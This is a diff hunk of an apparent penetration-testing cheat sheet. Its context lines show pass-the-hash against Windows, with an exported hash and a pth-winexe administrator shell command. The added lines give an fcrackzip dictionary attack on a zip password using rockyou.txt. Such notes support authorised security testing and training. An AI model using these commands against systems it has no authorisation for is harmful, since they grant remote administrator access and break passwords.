@@ -136,5 +136,7 @@ Passing the Hash in Windows
      export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
      # pth-winexe -U administrator //$ip cmd
 
+Cracking zip file password
+     # fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u <filename>.zip
 
 
